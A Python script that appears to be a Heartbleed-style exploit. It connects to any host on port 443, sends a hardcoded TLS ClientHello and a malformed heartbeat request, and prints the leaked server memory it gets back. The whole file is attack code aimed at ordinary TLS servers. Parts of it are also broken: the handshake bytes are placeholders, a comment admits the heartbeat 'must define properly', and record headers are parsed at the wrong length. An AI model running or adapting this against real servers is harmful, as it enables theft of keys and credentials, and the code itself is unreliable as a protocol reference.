import sys
import socket
import struct
import select
import array

# TLS ClientHello packet (partial, hardcoded example for demonstration)
CLIENT_HELLO = array.array('B', [
    0x16, 0x03, 0x03, 0x00, 0x2f, 0x01,
    0x00, 0x00, 0x2b, 0x03, 0x03,
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
    0x00, 0x01, 0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d,
    0x1e, 0x1f, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
    0x00, 0x00, 0x02, 0x00, 0x2f, 0x01, 0x00, 0x00, 0x00
])

# Heartbeat request (example — must define properly)
HEARTBEAT = array.array('B', [
    0x18, 0x03, 0x02, 0x00, 0x03,
    0x01, 0x40, 0x00
])

# Constants
SERVER_HELLO_DONE = 14
HEARTBEAT_RESPONSE = 21


def recv_all(sock, length):
    """Receive the specified number of bytes from the socket."""
    data = b''
    while length > 0:
        readable, _, _ = select.select([sock], [], [])
        if sock in readable:
            chunk = sock.recv(length)
            if not chunk:
                break
            data += chunk
            length -= len(chunk)
    return data


def read_packet(sock):
    """Read a TLS record from the socket."""
    HEADER_LENGTH = 6
    header = recv_all(sock, HEADER_LENGTH)

    if not header:
        print("Empty response header.")
        return None, None, b'', None

    print("Header:", header.hex(" "))

    if len(header) < HEADER_LENGTH:
        print("Incomplete header received.")
        return None, None, b'', None

    record_type = header[0]
    version = struct.unpack('>H', header[1:3])[0]
    length = struct.unpack('>H', header[3:5])[0]
    msg_type = header[5]

    payload = recv_all(sock, length - 1) if length > 1 else b''
    return record_type, version, payload, msg_type


def read_server_heartbeat(sock):
    """Read 4 packets (expecting heartbeat response among them)."""
    payload = b''
    for _ in range(4):
        record_type, version, packet_payload, msg_type = read_packet(sock)
        payload += packet_payload
    return record_type, version, payload, msg_type


def exploit(sock):
    """Send heartbeat and read response to check for Heartbleed-like vulnerability."""
    sock.send(HEARTBEAT)
    print("Sent Heartbeat")

    record_type, version, payload, msg_type = read_server_heartbeat(sock)

    if record_type is not None and msg_type == HEARTBEAT_RESPONSE:
        try:
            print("Heartbeat Response:\n", payload.decode('utf-8', errors='replace'))
        except Exception as e:
            print(f"Error decoding payload: {e}")
    else:
        print("No valid heartbeat response received.")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 script.py <host>")
        sys.exit(1)

    host = sys.argv[1]
    port = 443

    with socket.create_connection((host, port)) as s:
        print(f"Connected to {host}:{port}")
        s.send(CLIENT_HELLO)

        # Wait for ServerHelloDone
        while True:
            record_type, version, payload, msg_type = read_packet(s)
            if msg_type == SERVER_HELLO_DONE:
                break

        exploit(s)


if __name__ == '__main__':
    main()
